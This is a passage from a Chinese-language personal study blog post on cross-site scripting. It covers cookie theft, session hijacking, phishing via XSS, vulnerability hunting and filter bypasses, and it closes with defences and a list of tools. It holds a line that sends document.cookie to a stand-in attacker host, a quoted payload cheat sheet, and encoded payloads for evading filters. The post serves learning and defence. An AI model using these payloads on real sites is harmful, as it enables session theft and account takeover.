title="默认"></a>默认</h4><p>&#160; &#160; &#160; &#160;默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="不同域"><a href="#不同域" class="headerlink" title="不同域"></a>不同域</h4><p>&#160; &#160; &#160; &#160;这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为<strong>本域</strong>。<br>&#160; &#160; &#160; &#160;例如有两个网站<code>www.a.com</code>和<code>test.a.com</code>且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从<code>test.a.com</code>获取到<code>www.a.com</code>的Cookie，可是如果<code>www.a.com</code>的Cookie值中的domain属性设置为父级域即<code>a.com</code>，就可以通过<code>test.a.com</code>的xss漏洞获取到<code>www.a.com</code>的Cookie值。</p><h4 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h4><p>&#160; &#160; &#160; &#160;这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在<code>www.a.com/admin/index.php</code>设置cookie值且不知道path，那么path默认为<code>/admin/</code>。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有<code>/admin/</code>目录下的javascipt才能读取前边设置的Cookie。</p><h4 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h4><p>&#160; &#160; &#160; &#160;HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。  </p><ul><li>利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。</li><li>利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。  </li></ul><p>感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)</p><h4 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h4><p>&#160; &#160; &#160; &#160;Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。</p><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>&#160; &#160; &#160; &#160;HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。<br>&#160; &#160; &#160; &#160;我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。</p><h5 id="B域设置A域Cookie"><a href="#B域设置A域Cookie" class="headerlink" title="B域设置A域Cookie"></a>B域设置A域Cookie</h5><p>&#160; &#160; &#160; &#160;在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。</p><h5 id="加载B域时Cookie传入问题"><a href="#加载B域时Cookie传入问题" class="headerlink" title="加载B域时Cookie传入问题"></a>加载B域时Cookie传入问题</h5><p>&#160; &#160; &#160; &#160;我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。  </p><ul><li>相关文章：<a href="https://www.cnblogs.com/cheney256/articles/8942240.html" target="_blank" rel="noopener">用P3P header解决iframe跨域访问cookie</a>  </li><li>相关阅读：<strong>《Web前端黑客技术揭秘》p41-42</strong>  </li></ul><h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>&#160; &#160; &#160; &#160;由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。<br>&#160; &#160; &#160; &#160;这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容</p><blockquote><p>&#160; &#160; &#160; &#160;Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。<br>&#160; &#160; &#160; &#160;在Session机制中，客户端和服务端也有被其他人利用的可能。<br>&#160; &#160; &#160; &#160;Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面</p></blockquote><p>&#160; &#160; &#160; &#160;这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。<br>&#160; &#160; &#160; &#160;会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。  </p><ul><li>通过javascript控制DOM对象来发起一个GET请求，如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.creatElement(&quot;img&quot;);</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;www.a.com&#x2F;del.php?id&#x3D;1&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure></li><li>通过javascript自动构造隐藏表单并提交(POST)</li><li>通过XMLHttpRequest直接发送一个POST请求</li></ul><p>&#160; &#160; &#160; &#160;我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。</p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>&#160; &#160; &#160; &#160;现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？</p><h4 id="XSS重定向钓鱼"><a href="#XSS重定向钓鱼" class="headerlink" title="XSS重定向钓鱼"></a>XSS重定向钓鱼</h4><p>&#160; &#160; &#160; &#160;即从<code>www.a.com</code>通过xss漏洞跳转到<code>www.b.com</code>的钓鱼页面上，整个过程变化明显，受害者易察觉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.a.com&#x2F;index.php?search&#x3D;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.b.com&#x2F;index.php&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>&#160; &#160; &#160; &#160;通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。</p><h4 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h4><p>&#160; &#160; &#160; &#160;攻击者通过javascript来添加一个新的<code>&lt;Iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p><h2 id="5-XSS漏洞的挖掘"><a href="#5-XSS漏洞的挖掘" class="headerlink" title="5) XSS漏洞的挖掘"></a>5) XSS漏洞的挖掘</h2><p>&#160; &#160; &#160; &#160;就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。</p><h3 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h3><p>&#160; &#160; &#160; &#160;通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。</p><blockquote><p>分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤</p></blockquote><h3 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h3><p>&#160; &#160; &#160; &#160;这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。</p><h4 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h4><p>&#160; &#160; &#160; &#160;首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如<code>&quot;&lt;&gt;&amp;;/&#39;:</code>等，如果连<code>&lt;&gt;</code>都未过滤/转义，那么该输入点很可能存在XSS漏洞。<br>&#160; &#160; &#160; &#160;如果<code>&lt;&gt;</code>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如<br><code>&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;</code>这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为<code>&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;</code>。<br>&#160; &#160; &#160; &#160;一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;标签</span><br><span class="line">利用方式1</span><br><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;a&gt;标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">input标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;</span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;</span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;form&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">&lt;iframe&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">svg&lt;&gt;标签</span><br><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">iframe</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><br>——引自<strong>wkend</strong>的文章<a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">《XSS小节》</a></p><h4 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h4><p>&#160; &#160; &#160; &#160;关于XSS的自动检测软件有许多，如Burp的Scan模块，<a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">BruteXSS</a>等，这里不做过多解释。</p><h2 id="6-shellcode的绕过"><a href="#6-shellcode的绕过" class="headerlink" title="6) shellcode的绕过"></a>6) shellcode的绕过</h2><h3 id="绕过XSS-Filter"><a href="#绕过XSS-Filter" class="headerlink" title="绕过XSS-Filter"></a>绕过XSS-Filter</h3><p>&#160; &#160; &#160; &#160;XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。</p><h4 id="空格回车和Tab"><a href="#空格回车和Tab" class="headerlink" title="空格回车和Tab"></a>空格回车和Tab</h4><p>&#160; &#160; &#160; &#160;对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将<code>;</code>作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到<code>;</code>便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字<code>javascript|alert</code>的过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javasc</span><br><span class="line">ript:aler</span><br><span class="line">t(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="IE6下测试成功" class="lazyload" data-src="https://i.loli.net/2019/03/10/5c83f56052a54.png"></p><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p>&#160; &#160; &#160; &#160;HTML中属性值支持ASCII码形式，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;替换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;其中在ASCII表中116为<code>t</code>，58为<code>:</code>。<br>&#160; &#160; &#160; &#160;也可以将<code>&amp;#01</code>,<code>&amp;#02</code>等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。</p><h4 id="Fuzz标签未过滤事件名"><a href="#Fuzz标签未过滤事件名" class="headerlink" title="Fuzz标签未过滤事件名"></a>Fuzz标签未过滤事件名</h4><p>&#160; &#160; &#160; &#160;如<code>&lt;img src=x onerror=alert(/xss/)&gt;</code>其中的onerror即为IMG标签的一个事件，通常这样的事件都是以<code>on</code>开头，常见的有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onReverse</span><br><span class="line">onSeek</span><br><span class="line">onSynchRestored</span><br><span class="line">onURLFlip</span><br><span class="line">onRepeat</span><br><span class="line">onPause</span><br><span class="line">onstop</span><br><span class="line">onmouseover</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;除此之外还有很多事件可以利用，这里不再一一列举。</p><h4 id="使用Css绕过"><a href="#使用Css绕过" class="headerlink" title="使用Css绕过"></a>使用Css绕过</h4><p>&#160; &#160; &#160; &#160;利用Css样式表可以执行javascript的特性，如<br>&#160; &#160; &#160; &#160;Css直接执行javascript：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:url(&quot;javascript:alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;css中使用expression执行javascript:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; style&#x3D;&quot;xss:expression(alert(&#x2F;xss&#x2F;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:expression(&quot;alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。<br>&#160; &#160; &#160; &#160;除了上述两种，还可以利用@import直接执行javascript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    @import &#39;javascript:alert(&quot;xss&quot;)&#39;;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。</p><h3 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h3><ul><li>大小写变换;</li><li>利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;</li><li>结合样式表注释字符/**/，通过css执行javascript</li><li>样式标签会过滤<code>\</code>和<code>\0</code>，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过</li><li>Css关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分</li><li>利用浏览器解析注释的问题</li></ul><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>&#160; &#160; &#160; &#160;javascript支持许多的编码格式，如：</p><ul><li>unicode</li><li>escapes</li><li>十六|十|八进制  </li></ul><p><strong>如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力</strong><br>在IE下甚至支持JScript Encode加密后的代码</p><h3 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h3><p>&#160; &#160; &#160; &#160;如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：<a href="http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm" target="_blank" rel="noopener">《疯狂的跨站之行》剑心(非原链接)</a></p><h2 id="7-XSS防御"><a href="#7-XSS防御" class="headerlink" title="7) XSS防御"></a>7) XSS防御</h2><p>&#160; &#160; &#160; &#160;说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>&#160; &#160; &#160; &#160;严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>&#160; &#160; &#160; &#160;减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>&#160; &#160; &#160; &#160;设置HttpOnly，开启WAF。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>&#160; &#160; &#160; &#160;感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(<a href="http://www.0x002.com)。" target="_blank" rel="noopener">www.0x002.com)。</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong><br>书籍：<br>《Web前端黑客技术揭秘》<br>《XSS跨站脚本攻击剖析与防御》<br>《白帽子讲Web安全》<br>《黑客攻防技术宝典Web实战篇》第二版<br>文章：</strong><br><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://github.com/dwqs/blog/issues/68" target="_blank" rel="noopener">浅说 XSS 和 CSRF</a><br><a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">Session攻击手段(会话劫持/固定)及其安全防御措施</a>  </p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md" target="_blank" rel="noopener">https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md</a>  2017灰袍技能精华<br><a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">https://github.com/rajeshmajumdar/BruteXSS</a> BruteXSS<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a> Beef神器<br><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> 用于检查跨站点跟踪的小型python脚本<br><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> 一个非常简单的反射XSS扫描仪支持GET/POST<br><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> 反射xss扫描器<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 浏览器的插件，它自动检查页面是否具有xss和漏洞<br><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> xss命令行工具用于测试web应用程序中xss负载列表<br><a href="https://github.com/UltimateHackers/XSStrike" target="_blank" rel="noopener">https://github.com/UltimateHackers/XSStrike</a> 用于XSS、WAF检测和旁路的模糊和蛮力参数<br><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码  </p>]]></content>
    
    <summary type="html">
    
      XSS个人学习笔记
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="XSS" scheme="https://www.0x002.com/tags/XSS/"/>
    
      <category term="web安全" scheme="https://www.0x002.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞的简单学习</title>
